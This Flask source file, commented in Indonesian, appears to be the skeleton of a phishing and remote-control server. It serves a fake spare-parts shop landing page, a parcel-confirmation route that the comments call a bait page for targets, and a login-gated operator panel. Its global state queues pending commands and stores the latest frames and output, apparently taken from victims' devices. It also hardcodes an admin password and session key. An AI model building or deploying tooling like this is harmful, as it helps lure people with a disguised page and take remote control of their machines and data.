import os
import base64
from flask import Flask, render_template, request, jsonify, session, redirect, url_for

app = Flask(__name__)
# Kunci rahasia untuk mengamankan sesi login operator
app.secret_key = "GEAR99_LAB_EXCLUSIVE_SECRET_KEY"

# Kredensial Login Administrator Panel Operator
USERNAME_ADMIN = "admin"
PASSWORD_ADMIN = "medusa123"

# State data global untuk menampung aliran data nirkabel
latest_frame = None
pending_commands = []
latest_output = ""

# --- 1. RUTE NAVIGASI HALAMAN (ROUTING) ---

@app.route('/')
def index():
    # Menampilkan Landing Page Utama Toko Sparepart Gear99
    return render_template('landing.html')

@app.route('/konfirmasi-paket')
def target_page():
    # Menampilkan Halaman Pancingan Target Otomatisasi
    return render_template('target.html')

@app.route('/operator')
def operator():
    # Memeriksa apakah operator sudah login atau belum
    if not session.get("logged_in"):
        return render_template('login.html')
    return render_template('operator.html')

@app.route('/login', methods=['POST'])
def login():
    if request.form.get("user") == USERNAME_ADMIN and request.form.get("pass") == PASSWORD_ADMIN:
        session["logged_in"] = True
        return redirect(url_for("operator"))
    return "Otorisasi Gagal. <a href='/operator'>Coba Lagi</a>"

@app.route('/logout')
def logout():
    session.pop("logged_in", None)
    return redirect(url_for("operator"))
